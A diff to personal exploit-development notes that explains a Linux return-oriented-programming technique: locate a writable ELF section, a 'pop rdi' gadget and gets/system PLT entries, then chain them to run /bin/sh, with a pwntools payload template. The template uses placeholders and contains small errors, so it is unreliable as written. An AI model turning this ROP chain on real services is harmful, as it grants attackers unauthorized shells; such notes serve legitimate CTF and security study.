@@ -19,7 +19,7 @@ Sequence:
 [Linux]
 Use this technique to call `system@plt` with `/bin/sh` as argument 
 
-1. Examine the header of the ELF to find a writable section with [[readelf]].
+1. ### Examine the header of the ELF to find a writable section with [[readelf]].
 ```bash
 readelf -h <ELF>  #displays the header
 Output:
@@ -50,12 +50,34 @@ Section Headers:
 > [!NOTE]
 > It is better to not use the straight address (0x404050) but to add some bytes eg. + 0x400 
 
-2. Find the "pop rdi" gadget with [[pwntools#7-return-oriented-programming|pwntools]]
+2. ### Find the "pop rdi" gadget with [[pwntools#7-return-oriented-programming|pwntools]]
 `pop_rdi = rop.rdi.address`
 
-3. Find the `system@plt` and `gets@plt` addresses with [[pwntools#7-return-oriented-programming]]
+3. ### Find the `system@plt` and `gets@plt` addresses with [[pwntools#7-return-oriented-programming]]
 `elf.plt['system']`
 `elf.plt['gets']`
 
-4. Construct the shellcode
+4. ### Construct the shellcode
+```py
+from pwn import *
 
+elf = ELF(/file)
+context.binary = elf 
+rop = ROP(elf)
+
+payload = OFFSET
+payload += p64(pop_rdi)
+payload += p64(writable elf section 0x404450)
+payload += p64(elf.plt['gets'])
+
+payload += p64(pop_rdi)
+payload += p64(writable elf section)
+payload += p64(elf.plt['system'])
+
+f = open(shell.py, 'wb')  #write to a file in binary format
+f = f.write(payload)
+f.close()
+```
+
+5. ### Deliver shellcode
+Deliver shellcode [[send_shell_to_file]]
